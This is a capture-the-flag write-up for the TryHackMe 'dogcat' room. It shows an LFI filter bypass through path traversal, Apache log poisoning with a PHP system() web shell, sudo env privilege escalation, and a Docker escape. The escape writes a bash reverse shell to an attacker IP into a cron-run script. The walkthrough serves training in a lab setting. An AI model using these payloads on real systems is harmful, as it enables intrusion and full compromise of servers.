# dogcat Writeup
https://tryhackme.com/room/dogcat


## Flag 1

First I navigate to the website running on the endpoint. The hint led me to believe that messing around with the view parameter was a good place to start. After trying different things it became obvious that they were filtering for the words cat or dog. The trick I used to get around this was:
```
?view=./dog/../../../../../../../SOME FILE
```
This is the source code filtering the requests.
* It checks for '.php' extension and adds it if missing
* It checks if view parameter includes either cat or dog
```
    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
```

After doing some research and manual checking of common files I came acrossed access.log.
```
?view=./dog/../../../../../../../var/log/apache2/access.log&ext
```
* Include the 'ext' so that it won't add the php extension to the end.

The access.log included ip, time, request, and user-agent information. I sent a modified request where I made the user-agent = `<?php system($_GET['cmd']);?>` This way when we navigate to access.log we can pass in a parameter 'cmd' which will execute commands on the system.

```?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=whoami```


I found a great blog post about log poisoning on apache servers with LFI [here](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/). I used the same metasploit module as well.

![alt text](https://github.com/nickswink/Dogcat-Writeup/blob/main/metasploit.PNG?raw=true)

* After this we drop in as user www-data and the first flag is in our current directory. 





## Flag 2

The second flag was pretty easy to find which was just a directory up.






## Flag 3 

The flag was in the root directory which we need root permissions for. After some quick manual enumeration I found that we are able to run /usr/bin/env without a password.

```
sudo -l 
Matching Defaults entries for www-data on 5d7fb280ac0c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 5d7fb280ac0c:
    (root) NOPASSWD: /usr/bin/env
```
A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/env/) and we can run `sudo env /bin/sh` and Boom! We are root! Navigate to /root to read flag3.txt





## Flag 4

Honestly I had no idea how to get flag 4. You need to escape the docker container that you are in which was a new concept for me.

Navigate to /opt/backups

```
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR-IP>/1234 0>&1'" >> backup.sh
```

On attacker machine:
```
nc -lnvp 1234
```

backup.sh runs frequently on the parent machine and will send you a priviledged parent shell when it does and the last flag is right there.
